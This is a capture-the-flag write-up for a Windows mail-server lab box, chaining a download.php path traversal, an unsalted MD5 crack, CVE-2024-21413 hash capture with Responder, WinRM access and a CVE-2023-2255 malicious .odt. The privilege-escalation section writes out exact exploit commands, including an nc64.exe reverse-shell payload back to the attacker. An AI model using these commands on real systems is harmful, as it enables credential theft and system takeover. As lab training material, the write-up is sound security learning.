# Mailing — Easy — Windows

**Date:** 22 - August - 2026

---

## Tags

`#windows` `#web` `#path-traversal` `#lfi` `#hmailserver` `#md5` `#hash-cracking` `#cve-2024-21413` `#monikerlink` `#outlook` `#responder` `#netntlmv2` `#winrm` `#libreoffice` `#cve-2023-2255` `#odt` `#scheduled-task` `#writable-directory` `#privesc`

---

## What I Know

| Item       | Detail                                                                                       |
| ---------- | -------------------------------------------------------------------------------------------- |
| Target     | 10.129.232.39 (vhost: mailing.htb)                                                            |
| OS         | Windows (IIS 10.0; hMailServer mail stack)                                                    |
| Open ports | 25/465/587 (SMTP), 80 (HTTP), 110/143/993 (POP3/IMAP), 135/139/445, 5985/47001 (WinRM)       |
| Foothold   | download.php path traversal -> hMailServer.ini admin MD5 -> CVE-2024-21413 -> maya NTLMv2     |
| User       | `maya` via WinRM (cracked NetNTLMv2) -> user.txt                                              |
| Privesc    | LibreOffice 7.4.0.1 CVE-2023-2255 malicious .odt in a writable dir opened by localadmin task  |
| Flags      | user.txt as maya; root.txt as localadmin                                                      |

---

## Recon Notes

### Nmap Results

```
nmap --min-rate 3000 -T4 -p- 10.129.232.39
PORT      STATE SERVICE
25/tcp    open  smtp
80/tcp    open  http
110/tcp   open  pop3
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
143/tcp   open  imap
445/tcp   open  microsoft-ds
465/tcp   open  smtps
587/tcp   open  submission
993/tcp   open  imaps
5985/tcp  open  wsman
7680/tcp  open  pando-pub
47001/tcp open  winrm
49664/tcp open  unknown
(+ dynamic RPC ports 49665-56317)

Nmap done: 1 IP address (1 host up) scanned in 89.58 seconds
```

<img width="864" height="733" alt="image" src="https://github.com/user-attachments/assets/83eec885-9569-4151-87af-77ce9de08003" />

```
nmap -sC -sV -p25,80,110,135,139,143,445,465,587,993,5985,7680 10.129.232.39
PORT     STATE SERVICE       VERSION
25/tcp   open  smtp          hMailServer smtpd
|_ smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to http://mailing.htb
110/tcp  open  pop3          hMailServer pop3d
143/tcp  open  imap          hMailServer imapd
445/tcp  open  microsoft-ds?
465/tcp  open  ssl/smtp      hMailServer smtpd
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/...EU\Spain
587/tcp  open  smtp          hMailServer smtpd
993/tcp  open  ssl/imap      hMailServer imapd
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
7680/tcp open  pando-pub?
Service Info: Host: mailing.htb; OS: Windows
```

<img width="1211" height="547" alt="image" src="https://github.com/user-attachments/assets/19b3af15-9f66-4966-aa51-164b2f07d660" />

**NOTE:** The high-numbered dynamic RPC ports were disregarded in the detailed scan; they are default and give no useful enumeration data.

```
# after adding mailing.htb to /etc/hosts
nmap -sC -sV -p80 10.129.232.39
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-title: Mailing
```

<img width="1520" height="1162" alt="image" src="https://github.com/user-attachments/assets/dff2eecb-bab2-4086-9e66-9910c5ac21ca" />

**What each port tells me:**
- **Ports 25, 465, 587 (SMTP)** — Mail submission/relay ports; the banner shows hMailServer. Interacting needs creds, but SMTP is also the delivery vector for the foothold exploit.
- **Port 80 (HTTP)** — IIS redirecting to mailing.htb; the web app is the starting point.
- **Ports 110, 143, 993 (POP3/IMAP)** — Mailbox retrieval; useful once I have mail creds.
- **Port 135 (MSRPC)** — Standard Windows RPC endpoint mapper; confirms a typical Windows host.
- **Ports 139, 445 (SMB)** — File-sharing surface worth checking for anonymous access.
- **Ports 5985, 47001 (WinRM)** — Remote management / PowerShell Remoting; the eventual shell route once I have creds.
- **Port 7680 (DoSvc)** — Windows Delivery Optimization peer update service; not useful here.
- **Ports 49664+ (MSRPC)** — Dynamic RPC ports; not directly actionable.

---

## Enumeration Log

```
OBSERVATION:
- The mail ports (25/465/587/110/143/993) are all hMailServer and need creds to use
- Port 80 redirects to mailing.htb
- Check SMB for anonymous access
- 5985/47001 (WinRM) need creds; 7680 and the dynamic RPC ports aren't useful here
WHAT IT TELLS ME:
- The mail server may hold sensitive info but needs creds; research hMailServer for known
  issues
- Add mailing.htb to /etc/hosts and explore the web app
- Test SMB for anonymous access
WHAT I AM GOING TO TRY:
- Research hMailServer
- Enumerate the web app (vhost-fuzz, dir-fuzz, stack, source)
- Try anonymous SMB
WHY:
- Look for exploitable issues and understand the app / find hidden content
RESULT:
- SMB: no anonymous access
- The web app shows:
  1. three users (Ruy, Maya, Gregory)
  2. a "Download instructions" link -> http://mailing.htb/download.php?file=instructions.pdf,
     a strong candidate for path traversal / LFI
  3. vhost-fuzz, dir-fuzz, stack and source review: shows nothing useful
  4. the instructions PDF is a 16-page guide to setting up a mail client (Windows Mail /
     Thunderbird); its "Ending" section shows a real email address, maya@mailing.htb
- download.php?file= IS vulnerable to path traversal (arbitrary file read). Since I want mail
  creds and the stack is hMailServer, I targeted its config file
- hMailServer stores config at C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini; reading
  it via the traversal exposed the Administrator password as an UNSALTED MD5 hash. CrackStation
  cracked it instantly -> homenetworkingadministrator
- Those creds logged into the mail server but the mailboxes held nothing useful
- The instructions point at a Windows Mail / Thunderbird client, so I looked for client-side
  CVEs and found CVE-2024-21413 (Outlook/Windows Mail "MonikerLink"): a crafted email with a
  file:// link causes the client, on preview, to authenticate to an attacker SMB share and
  leak NetNTLMv2. Flags used:
    --server mailing.htb --port 587
    --username administrator@mailing.htb   (admin creds we cracked)
    --password homenetworkingadministrator
    --sender  <any>@mailing.htb
    --recipient maya@mailing.htb           (from the instructions PDF)
    --url \\<LHOST>\share                   (points the victim at my Responder)
    --subject <any>
- Ran the exploit with Responder listening; caught maya's NetNTLMv2 and cracked it with john
  -> maya:m4y4ngs4ri
- evil-winrm as maya -> read user.txt
WHAT NEXT:
- Enumerate as maya for a privesc path
```

<img width="667" height="107" alt="image" src="https://github.com/user-attachments/assets/5045b9cb-4cf0-46d5-bae2-cb0c31122fe0" />

> Shows that the SMB server is not accessible anonymously

<img width="2188" height="1222" alt="image" src="https://github.com/user-attachments/assets/9d39b7c4-fb28-4114-982b-59a256c7ad87" />

> The web page which shows the 3 users ruy, maya and gregory

<img width="2234" height="1147" alt="image" src="https://github.com/user-attachments/assets/32157949-ff51-4199-8997-08a983f758b3" />

> the instruction manual which shows the installation the mail client thunderbird and windows mail

<img width="1349" height="665" alt="image" src="https://github.com/user-attachments/assets/4fa22b3e-9fe2-4fb7-a4c2-bdabb407bafa" />

> The page in the instruction manual which shows the email address of the user maya, since there is a user maya this could be a leak of the users actual email

<img width="2105" height="876" alt="image" src="https://github.com/user-attachments/assets/5a230b4b-231f-4ab0-b757-b72c57168d0d" />

> Shows indication that the URL is vulnerable to LFI

<img width="1518" height="386" alt="image" src="https://github.com/user-attachments/assets/65b0f437-78e7-4ac1-95f7-340cf2352a97" />

> Research showing the default location of config files for hMailServer

<img width="2102" height="744" alt="image" src="https://github.com/user-attachments/assets/6f1db26a-303c-4190-b005-a8ba7b1bbaa4" />

> Using LFI to retrieve the config file which contains hashed password of the administrator

<img width="1342" height="511" alt="image" src="https://github.com/user-attachments/assets/df365018-303d-469b-8d3c-6fa836d8423a" />

> Using crack station to decrypt the password

<img width="2522" height="567" alt="image" src="https://github.com/user-attachments/assets/7c1db752-5186-49eb-b157-6d20b541f0b0" />

> Using the github exploit to trigger the user to connect back to our SMB share and authenticate using password

<img width="2265" height="436" alt="image" src="https://github.com/user-attachments/assets/ca59c70e-567c-47c8-accb-05f913ae8642" />

> Responder catches the creds of the user maya

<img width="1224" height="353" alt="image" src="https://github.com/user-attachments/assets/da0d203a-9e06-4727-958b-88de5dcc64bf" />

> I was able to use john to crack the password

<img width="1629" height="703" alt="image" src="https://github.com/user-attachments/assets/46266488-d0a2-47a9-8e4d-e0838ffbc9b6" />

> Was able to access the server as maya and read user.txt

```
OBSERVATION:
- Enumerating as maya, the box has several third-party applications installed
WHAT IT TELLS ME:
- Research the non-default third-party apps for privesc-worthy vulnerable versions
WHAT I AM GOING TO TRY:
- Check installed third-party app versions for known CVEs
WHY:
- Outdated third-party software is a common privesc vector
RESULT:
- LibreOffice 7.4.0.1 is installed (version in
  C:\Program Files\LibreOffice\program\version.ini) -> vulnerable to CVE-2023-2255
- CVE-2023-2255: a malicious .odt can load remote content / execute an embedded command
  without prompting, so when a user OPENS the document, my command runs as that user
- winPEAS shows C:\Users\localadmin\Documents\scripts\soffice.ps1 runs every minute, but I
  can't read soffice.ps1 (it's in localadmin's home). So a document dropped where that script
  processes files would be opened by localadmin and run my payload as localadmin
- Found a non-default directory C:\Important Documents; checking permissions, maya can WRITE
  to it -> almost certainly the folder the scheduled script watches
- Built a malicious .odt with the elweth-sec PoC (payload calls C:\ProgramData\nc64.exe back
  to me), staged nc64.exe in C:\ProgramData, started a listener, and dropped the .odt into
  C:\Important Documents
- Within a minute I got a reverse shell as localadmin and read root.txt
```

<img width="2074" height="1069" alt="image" src="https://github.com/user-attachments/assets/2024ff0e-9725-42fd-898c-21fc9a66f487" />

> Finding the application installed on the server

<img width="1193" height="609" alt="image" src="https://github.com/user-attachments/assets/ee92a499-cea6-4475-a13f-120f1a569df3" />

> Exploit in github

<img width="2404" height="357" alt="image" src="https://github.com/user-attachments/assets/aeaeea7a-cfb9-4bf6-ac0c-f23ecf325e8d" />

> this shows that C:\Users\localadmin\Documents\scripts\soffice.ps1 is run every minute however since it is in localadmins home folder we would not be able to view it

<img width="976" height="748" alt="image" src="https://github.com/user-attachments/assets/22f6142d-52c3-421a-a0ee-5b323678c833" />

> Since we know that there is a script running every minute the best guess is that it is running on some directory

<img width="1013" height="229" alt="image" src="https://github.com/user-attachments/assets/a2ea8659-39f8-4913-ad67-2c7c3847bde1" />

> Looking at the permissions it looks like maya can write to the directory

<img width="1676" height="870" alt="image" src="https://github.com/user-attachments/assets/520a50db-7fe7-4391-aeae-30705ed362e0" />

> creating the malicious .odt file using the github exploit

<img width="1425" height="524" alt="image" src="https://github.com/user-attachments/assets/1fec7877-1b7d-4734-9ac7-c804478764b1" />

> downloading it and then we have to move nc64.exe to C:\ProgramData as we are pointing to it for nc64.exe and move the malicious .odt file to Important documents

<img width="1430" height="848" alt="image" src="https://github.com/user-attachments/assets/f03ba5c6-4ad2-44a9-9da0-8b1cba47d01f" />

> Before moving the malicious .odt file to Important documents we start a listener and then move the file to it, after a minute we observe that we get a reverse shell as localadmin and we are able to read root.txt

---

## Foothold

**How I got in:** The web app's `download.php?file=` was vulnerable to **path traversal** (arbitrary file read). Because the stack is hMailServer, I read its config at `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini`, which exposed the Administrator password as an **unsalted MD5** hash; CrackStation cracked it instantly to `homenetworkingadministrator`. The mailboxes held nothing, but the instructions PDF leaked `maya@mailing.htb`, so I used **CVE-2024-21413 (the Outlook/Windows Mail "MonikerLink" bug)**: sending maya a crafted email whose `file://` link points at my SMB share makes her client authenticate to me on preview, leaking her **NetNTLMv2** hash to **Responder**. I cracked it with john to `maya:m4y4ngs4ri` and logged in over **WinRM** for user.txt.

**Command / exploit used:**

```
# path traversal -> read hMailServer config
curl "http://mailing.htb/download.php?file=../../../../Program Files (x86)/hMailServer/Bin/hMailServer.ini"
# -> Administrator MD5 hash ; crack on CrackStation -> homenetworkingadministrator

# CVE-2024-21413 (MonikerLink) with Responder catching maya's NTLMv2
sudo responder -I tun0 -v
python3 CVE-2024-21413.py --server mailing.htb --port 587 \
  --username administrator@mailing.htb --password homenetworkingadministrator \
  --sender administrator@mailing.htb --recipient maya@mailing.htb \
  --url '\\<LHOST>\share' --subject HI
# crack the captured hash, then WinRM
hashcat -m 5600 maya.hash rockyou.txt      # -> m4y4ngs4ri
evil-winrm -i 10.129.232.39 -u maya -p 'm4y4ngs4ri'    # -> user.txt
```

**Why it worked:** Two chained failures. First, `download.php` built a file path from user input without normalising `../`, so it read any file on disk, including a config file that stored the admin password as an **unsalted MD5** (fast to crack). Second, CVE-2024-21413 abuses how Outlook/Windows Mail parses a `file://` moniker with a `!` to bypass Protected View: previewing the message triggers an outbound SMB authentication, so a mail client that merely renders the email leaks its user's NetNTLMv2 with no click. Delivering that email required a valid SMTP login, which the cracked admin creds provided.

---

## Privilege Escalation

**Path taken (maya -> localadmin):** As maya, the box had **LibreOffice 7.4.0.1** installed (from `version.ini`), vulnerable to **CVE-2023-2255**, where a crafted `.odt` executes an embedded command when opened. winPEAS showed `C:\Users\localadmin\Documents\scripts\soffice.ps1` runs **every minute** (unreadable, in localadmin's home), implying an automated task that opens documents as localadmin. I found a non-default directory `C:\Important Documents` that **maya could write to**, the folder the task processes. I built a malicious `.odt` (elweth-sec PoC) whose payload calls `nc64.exe` back to me, staged `nc64.exe` in `C:\ProgramData`, dropped the `.odt` into `C:\Important Documents`, and within a minute caught a reverse shell as **localadmin** for root.txt.

**Command / exploit used:**

```
# confirm the vulnerable version and the writable drop directory
type "C:\Program Files\LibreOffice\program\version.ini"     # 7.4.0.1
icacls "C:\Important Documents"                              # maya: (M)

# build the malicious .odt (runs as whoever opens it = localadmin's task)
python3 CVE-2023-2255.py --cmd 'cmd /c C:\ProgramData\nc64.exe <LHOST> <LPORT> -e cmd' --output exploit.odt

# stage nc, start listener, drop the odt where soffice.ps1 processes it
# (upload nc64.exe to C:\ProgramData and exploit.odt to C:\Important Documents)
nc -lnvp <LPORT>        # -> shell as localadmin within ~1 min -> root.txt
```

**Why it worked:** CVE-2023-2255 makes a LibreOffice document a code-execution payload: an embedded object runs a command with no prompt when the file is opened. The box had an automated process running as **localadmin** that opened documents from a directory maya could write to, so this is a classic "malicious file in a writable path processed by a higher-privileged automated task" chain. maya supplied the file; localadmin's scheduled `soffice.ps1` supplied the privileged execution, and the `.odt` bridged the two.

